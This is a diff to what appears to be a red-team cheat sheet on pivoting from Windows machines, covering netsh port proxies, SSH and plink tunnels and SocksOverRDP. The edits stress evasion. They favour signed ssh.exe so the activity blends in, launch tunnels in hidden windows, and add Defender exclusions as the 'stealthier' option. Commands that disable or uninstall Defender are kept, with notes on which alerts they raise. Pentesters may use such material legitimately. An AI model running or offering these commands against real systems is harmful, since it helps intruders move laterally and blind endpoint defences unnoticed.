@@ -10,23 +10,21 @@ Windows environments often have tools like `netsh` (native), `plink.exe` (PuTTY 
 
 > Windows built-in TCP port proxy. No additional tools required.
 
-### Add port forward
+::: code-group
 
-```bash
+```bash [add forward]
 netsh interface portproxy add v4tov4 listenaddress=$LHOST listenport=$LPORT connectaddress=$RHOST connectport=$RPORT
 ```
 
-### Verify configuration
+```bash [delete forward]
+netsh interface portproxy delete v4tov4 listenaddress=$LHOST listenport=$LPORT
+```
 
-```bash
+```bash [show config]
 netsh interface portproxy show v4tov4
 ```
 
-### Delete port forward
-
-```bash
-netsh interface portproxy delete v4tov4 listenaddress=$LHOST listenport=$LPORT
-```
+:::
 
 ### Enable IP forwarding (required for routing)
 
@@ -35,6 +33,44 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRou
 ```
 
 > [!warning] Requires admin privileges.
+
+## 🔌 OpenSSH - Native SSH Client (Windows 10+)
+
+> `ssh.exe` ships signed by Microsoft on Windows 10/11 and Server 2019+. Preferred over dropping `plink.exe`: no new binary on disk, blends in as a legitimate admin tool.
+
+### Dynamic SOCKS proxy
+
+```bash
+ssh -D $SOCKS_PORT -N $PIVOT_USER@$PIVOT_HOST   # -N: no remote command, just forward
+```
+
+### Port forwarding
+
+::: code-group
+
+```bash [Local]
+# Local forward (reach an internal service via the pivot)
+ssh -L $LPORT:$TARGET_HOST:$RPORT -N $PIVOT_USER@$PIVOT_HOST
+```
+
+```bash [Remote]
+# Remote forward (expose an attacker port into the target network)
+ssh -R $RPORT:127.0.0.1:$LPORT -N $PIVOT_USER@$PIVOT_HOST
+```
+
+:::
+
+### Key-based auth (no password prompt)
+
+```bash
+ssh -D $SOCKS_PORT -N -i %USERPROFILE%\.ssh\id_ed25519 $PIVOT_USER@$PIVOT_HOST
+```
+
+### Background tunnel
+
+```powershell
+Start-Process ssh -ArgumentList "-D $SOCKS_PORT -N $PIVOT_USER@$PIVOT_HOST" -WindowStyle Hidden
+```
 
 ## 🔌 plink.exe - SSH Tunneling (PuTTY Link)
 
@@ -48,13 +84,19 @@ plink -ssh -D $SOCKS_PORT $PIVOT_USER@$PIVOT_HOST
 
 ### Port Forwarding
 
-```bash
+::: code-group
+
+```bash [Local]
 # Local port forward
 plink -ssh -L $LPORT:$TARGET_HOST:$RPORT $PIVOT_USER@$PIVOT_HOST
+```
 
+```bash [Remote]
 # Remote port forward
 plink -ssh -R $RPORT:127.0.0.1:$LPORT $PIVOT_USER@$PIVOT_HOST
 ```
+
+:::
 
 ### Key-based authentication (PuTTY .ppk format)
 
@@ -119,10 +161,11 @@ xfreerdp /v:$PIVOT_HOST /u:$USER /p:$PASSWORD
 2. On pivot – disable Defender & register DLL
 
 ```bash
-# Disable Windows Defender (GUI or PowerShell)
+# Stealthier: whitelist only the plugin path instead of killing protection
+Add-MpPreference -ExclusionPath "C:\path\to\SocksOverRDP-Plugin.dll"
+
+# Noisy baseline: disable real-time scanning   # emits Event ID 5001, flagged by most EDR/SIEM
 Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableArchiveScanning $true
-Set-MpPreference -DisableBehaviorMonitoring $true
 
 # Register plugin (as Administrator)
 regsvr32.exe SocksOverRDP-Plugin.dll
@@ -138,7 +181,10 @@ mstsc.exe /v:$TARGET_HOST
 4. On target – run server
 
 ```bash
-# Disable Defender (required)
+# Stealthier: exclude the server binary rather than removing Defender
+Add-MpPreference -ExclusionPath "C:\path\to\SocksOverRDP-Server.exe"
+
+# Noisy baseline: remove Defender entirely   # Server only, forces a reboot - very loud
 Uninstall-WindowsFeature -Name Windows-Defender
 
 # Run server as Administrator
